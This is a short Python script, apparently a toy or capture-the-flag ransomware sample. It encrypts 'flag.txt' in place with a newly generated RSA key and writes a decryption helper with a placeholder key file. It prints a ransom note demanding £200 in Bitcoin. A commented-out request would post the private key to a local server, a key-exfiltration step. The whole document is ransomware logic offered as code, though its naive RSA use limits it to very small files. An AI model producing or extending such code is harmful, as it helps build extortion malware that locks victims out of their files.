import rsa
import requests

def getCipher(file, publicKey):
    #response = requests.post(url, json=data, timeout=3)
    with open(file, 'rb') as f:
        plaintext = f.read()

    ciphertext = rsa.encrypt(plaintext, publicKey)

    with open(file, 'wb') as f:
        f.write(ciphertext)
    return ciphertext

def main():
    file = "flag.txt"
    publicKey, privateKey = rsa.newkeys(512)
    privatePEM = privateKey.save_pkcs1(format='PEM')
    url = "http://127.0.0.1:1337/"
    data = {"KEY":privatePEM.decode('utf-8')}

    print(privatePEM.decode('utf-8'))

    try:
        ciphertext = getCipher(file, publicKey)

        with open("key.py", 'w') as f:
            f.write(
            """import rsa
with open("key.txt", 'r') as f:
    key = f.read()
privateKey = rsa.PrivateKey.load_pkcs1(key)
with open("flag.txt", 'rb') as f:
    ciphertext = f.read()
decrypted = rsa.decrypt(ciphertext,privateKey).decode()
with open("flag.txt", 'w') as f:
    f.write(decrypted)"""
        )
        with open("key.txt", 'w') as f:
            f.write("Replace me with your RSA key")
    
        print("Your files have been encrypted, if you want them back send £200 in BTC to [ADDRESS], I will then give you the key to decrypt your files")

    except Exception as e:
        print("Error:", e)

main()
